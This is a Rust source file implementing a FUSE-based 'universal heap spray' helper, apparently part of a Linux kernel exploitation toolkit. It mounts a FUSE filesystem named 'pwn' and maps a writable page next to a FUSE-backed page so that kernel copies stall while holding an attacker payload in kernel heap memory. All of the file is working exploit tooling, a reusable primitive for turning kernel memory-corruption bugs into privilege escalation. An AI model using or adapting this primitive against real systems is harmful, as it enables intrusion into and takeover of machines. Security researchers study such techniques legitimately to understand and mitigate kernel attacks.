//extern crate fuse as libfuse;
//use crate::spray::fuse;

use std::ffi::OsStr;
use std::path::Path;

pub struct UnivSprayHandle<'a> {
    pub addr: *mut libc::c_void,
    _session: libfuse::BackgroundSession<'a>,
    payload_size: usize,
}

impl Drop for UnivSprayHandle<'_> {
    fn drop(&mut self) {
        unsafe {
            let result = libc::munmap(self.addr, 0x1000);
            if result == -1 {
                panic!("failed to close fuse fd");
            }
            let result = libc::munmap(self.addr.add(0x1000), 0x1000);
            if result == -1 {
                panic!("failed to unmap page 2");
            }
        }
    }
}

impl UnivSprayHandle<'_> {
    /// Copies all but the last byte of `payload` just up to the page boundary
    ///
    /// Args:
    /// * `payload` - A vector containing the payload to be sprayed
    pub fn write_payload(&mut self, payload: Vec<u8>) {
        self.payload_size = payload.len();
        unsafe {
            libc::memcpy(
                self.addr.add(0x1000).sub(payload.len() - 1),
                payload[..payload.len() - 1].as_ptr() as *const libc::c_void,
                payload.len() - 1,
            );
        }
    }
}

fn map_univ_spray_pages(dir_path: &str) -> *mut libc::c_void {
    unsafe {
        let fuse_fd = libc::open(format!("{dir_path}/pwn\0").as_ptr() as *const i8, 0);
        if fuse_fd == -1 {
            panic!("failed to open fuse fd");
        }

        let addr = libc::mmap(
            std::ptr::null_mut(),
            0x2000,
            libc::PROT_WRITE,
            libc::MAP_ANON | libc::MAP_PRIVATE,
            -1,
            0,
        );
        if addr == libc::MAP_FAILED {
            panic!("failed to mmap univ spray memory");
        }
        libc::munmap(addr, 0x2000);

        let addr = libc::mmap(
            addr,
            0x1000,
            libc::PROT_WRITE,
            libc::MAP_ANON | libc::MAP_PRIVATE,
            -1,
            0,
        );
        if addr == libc::MAP_FAILED {
            panic!("failed to mmap univ spray memory");
        }

        let fuse_page = libc::mmap(
            addr.add(0x1000),
            0x1000,
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            //fuse_fd.as_raw_fd(),
            fuse_fd,
            0,
        );
        if fuse_page == libc::MAP_FAILED {
            panic!("failed to mmap fuse page");
        }

        libc::close(fuse_fd);
        addr
    }
}

/// Prepare for FUSE based universal heap spray
///
/// Args:
/// * `dir_path` - The path to mount the FUSE filesystem at
/// * `fs` - A 'FuseFS' instance with a custom 'read' handler implemented
///
/// Return:
/// * Background session thread for mounted filesystem, when the session is
///   dropped, the filesystem will be unmounted
pub fn setup_univ_spray<T>(dir_path: &str, fs: fuse::FuseFS<T>) -> UnivSprayHandle
where
    T: fuse::FuseReadHandler + std::marker::Send + 'static,
{
    let fuse_dir = std::fs::create_dir(Path::new(dir_path));
    drop(fuse_dir);

    let options = ["-o", "ro", "-o", "fsname=pwn"]
        .iter()
        .map(|o| o.as_ref())
        .collect::<Vec<&OsStr>>();

    let session = unsafe { libfuse::spawn_mount(fs, &dir_path, &options) }
        .expect("Failed to spawn FUSE mount thread");

    let addr = map_univ_spray_pages(dir_path);

    UnivSprayHandle {
        addr,
        _session: session,
        payload_size: 0,
    }
}
